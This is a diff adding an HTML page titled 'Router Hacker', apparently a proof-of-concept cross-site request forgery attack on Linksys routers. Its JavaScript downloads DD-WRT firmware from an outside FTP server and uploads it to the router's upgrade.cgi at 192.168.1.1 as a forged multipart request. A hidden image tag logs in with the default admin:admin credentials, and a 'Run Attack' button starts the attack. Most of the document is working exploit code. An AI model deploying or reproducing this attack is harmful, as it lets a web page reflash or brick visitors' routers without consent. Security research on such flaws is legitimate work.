@@ -1,0 +1,194 @@
+<html lang="en">
+  
+  <head>
+    <title>Router Hacker</title>
+    <style type="text/css">
+      .attackBtn {
+        -moz-box-shadow:inset 0px 1px 0px 0px #ffffff;
+        -webkit-box-shadow:inset 0px 1px 0px 0px #ffffff;
+        box-shadow:inset 0px 1px 0px 0px #ffffff;
+        background:-webkit-gradient(linear, left top, left bottom, color-stop(0.05, #ededed), color-stop(1, #dfdfdf));
+        background:-moz-linear-gradient(center top, #ededed 5%, #dfdfdf 100%);
+        filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ededed', endColorstr='#dfdfdf');
+        background-color:#ededed;
+        -moz-border-radius:6px;
+        -webkit-border-radius:6px;
+        border-radius:6px;
+        border:1px solid #dcdcdc;
+        display:inline-block;
+        color:#777777;
+        font-family:arial;
+        font-size:28px;
+        font-weight:bold;
+        padding:14px 54px;
+        text-decoration:none;
+        text-shadow:1px 1px 0px #ffffff;
+      }
+      .attackBtn:hover {
+        background:-webkit-gradient(linear, left top, left bottom, color-stop(0.05, #dfdfdf), color-stop(1, #ededed));
+        background:-moz-linear-gradient(center top, #dfdfdf 5%, #ededed 100%);
+        filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#dfdfdf', endColorstr='#ededed');
+        background-color:#dfdfdf;
+      }
+      .attackBtn:active {
+        position:relative;
+        top:1px;
+      }
+      .progress {
+        visibility: show;
+      }
+      .meter-wrap {
+        position: relative;
+        margin-left: auto;
+        margin-right: auto;
+      }
+      .meter-wrap, .meter-value, .meter-text {
+        /* The width and height of your image */
+        width: 675px;
+        height: 60px;
+      }
+      .meter-wrap, .meter-value {
+        background: #bdbdbd top left no-repeat;
+      }
+      #meter-value {
+        /* float: right; /* this will make it run in reverse */
+        background-color: #0a0;
+        width:0%;
+      }
+      #meter-value-up {
+        background-color: #a00;
+        width:0%;
+      }
+      .meter-text {
+        position: absolute;
+        top:-25;
+        left:0px;
+        padding-top: 5px;
+        color: #000;
+        text-align: center;
+        width: 100%;
+      }
+    </style>
+  </head>
+  
+  <body>
+    <script type="text/javascript">
+      function fileUpload() {
+        /* where the firmware will be uploaded */
+        var destination = "http://192.168.1.1/upgrade.cgi";
+        var runningLog=document.getElementById("runningLog");
+        /* filename of new firmware */
+        var fileName = "dd-wrt.v24-12548_NEWD_mini.bin";
+        /* where the new firmware will be sourced */
+        var srcFile = "ftp://ftp.dd-wrt.com/others/eko/V24_TNG/svn12548/dd-wrt.v24-12548_NEWD_mini.bin";
+        document.getElementById('start-button').innerText = "Running Attack...";
+        document.getElementById('progress').style.visibility = "show";
+        /* Generate the first XHR to access the new firmware */
+        x = new XMLHttpRequest;
+        x.addEventListener("progress", updateProgress, false);
+        x.addEventListener("load", transferComplete, false);
+        x.open("get", srcFile);
+        runningLog.innerHTML="Downloading DD-WRT firmware...<br/>";
+        /* Progress bar that tracks the new firmware download */
+        function updateProgress(evt) {
+          if (evt.lengthComputable) {
+            var percentComplete = evt.loaded * 100 / evt.total;
+            document.getElementById('meter-value').style.width = percentComplete.toFixed(0).toString() + '%';
+            document.getElementById('meter-text').innerHTML = 'Firmware Download: ' + percentComplete.toFixed(0).toString() + '% complete';
+          } else {
+            document.getElementById('meter-text').innerHTML = "Unknown size";
+          }
+        }
+
+        function transferComplete(evt) {
+          document.getElementById('meter-value').style.width = '100%';
+          document.getElementById('meter-text').innerHTML = 'Download: 100% complete';
+        }
+        /* This tells JavaScript not to try to interpret the binary data, and to leave it raw */
+        x.overrideMimeType("text/plain; charset=x-user-defined");
+        x.send();
+        /* When the firmware finishes downloading, generate the next request */
+        x.onreadystatechange = function () {
+          if (x.readyState == 4) {
+          runningLog.innerHTML+="DD-WRT firmware received...<br/>";
+           /* This used to be necessary in some browsers to properly parse the binary data without corrupting it */
+           a = x.responseText || "";
+            var ff = [];
+            var mx = a.length;
+            var scc = String.fromCharCode;
+            for (var z = 0; z < mx; z++) {
+              ff[z] = scc(a.charCodeAt(z) & 255)
+            }
+            var fileData = ff.join("");
+            xhr = new XMLHttpRequest;
+            /* This is the spoof the HTTP multipart/form-data request format */
+            runningLog.innerHTML+="Creating new CSRF Request...<br/>";
+            /* The boundary is used by the server to differentiate request paramters. */
+            /* The exact value of it is irrelevent as long as the same boundary is used for the entire request */
+            var fileSize = fileData.length,
+              boundary = "---------------------------168072824752491622650073";
+            xhr.open("POST", destination, true);
+            xhr.withCredentials = "true";
+            xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=" + boundary);
+            var body = boundary + "\r\n";
+            body += 'Content-Disposition: form-data; name="submit_button" \r\n\r\nUpgrade\r\n';
+            body += boundary + '\r\nContent-Disposition: form-data; name="change_action"\r\n\r\n\r\n';
+            body += boundary + '\r\nContent-Disposition: form-data; name="action"\r\n\r\n\r\n';
+            body += boundary + '\r\nContent-Disposition: form-data; name="file"; filename="' + fileName + '"\r\n';
+            body += "Content-Type: application/macbinary\r\n";
+            body += "\r\n" + fileData + "\r\n\r\n";
+            body += boundary + '\r\nContent-Disposition: form-data; name="process"\r\n\r\n\r\n';
+            body += boundary + "--";
+            /* the next section of code is for browsers that dont yet support sendAsBinary natively */
+            if (typeof XMLHttpRequest.prototype.sendAsBinary == "undefined" && Uint8Array) {
+              XMLHttpRequest.prototype.sendAsBinary = function (datastr) {
+                function byteValue(x) {
+                  return x.charCodeAt(0) & 255
+                }
+                var ords = Array.prototype.map.call(datastr, byteValue);
+                var ui8a = new Uint8Array(ords);
+                this.send(ui8a.buffer)
+              }
+            }
+            document.getElementById('loading').innerHTML = "<img src='loading.gif'>";
+            runningLog.innerHTML+="Uploading dd-wrt firmware to Linksys device...<br/>";
+            /* using the new sendAsBinary() function */
+            xhr.sendAsBinary(body);
+            xhr.onreadystatechange = function () {
+          if (xhr.readyState == 4) {
+          runningLog.innerHTML+="Firmware upload complete...<br/>";
+          runningLog.innerHTML+="Please wait 3 minutes then power cycle the device..<br/>";
+          document.getElementById('loading').innerHTML = "<img src='dd-wrt.gif'>";
+          }
+          }
+            return true
+          }
+        }
+      };
+    </script>
+    <br>
+    <center>
+    <p>WARNING: CLICKING BUTTON CAN RESULT IN SERIOUS INJURY OR BRICKED DEVICES</p>
+      <div onclick="fileUpload();" id="start-button" class="attackBtn">Run Attack</div>
+    </center>
+    <br>
+    <br>
+    <div class="progress" id="progress">
+      <div class="meter-wrap" id="meter-wrap">
+        <div class="meter-value" id="meter-value">
+          <div class="meter-text" id="meter-text"></div>
+        </div>
+      </div>
+      <br/>
+      <br/>
+      <div id="runningLog"></div>
+      <center>
+        
+        <div id="loading"></div>
+      </center>
+    </div>
+    <!-- load a background image to log into the device at 192.168.1.1 if it is using default credentials -->
+    <img style="visibility:hidden" src="http://admin:admin@192.168.1.1/" alt="hacked">
+  </body>
+
+</html>
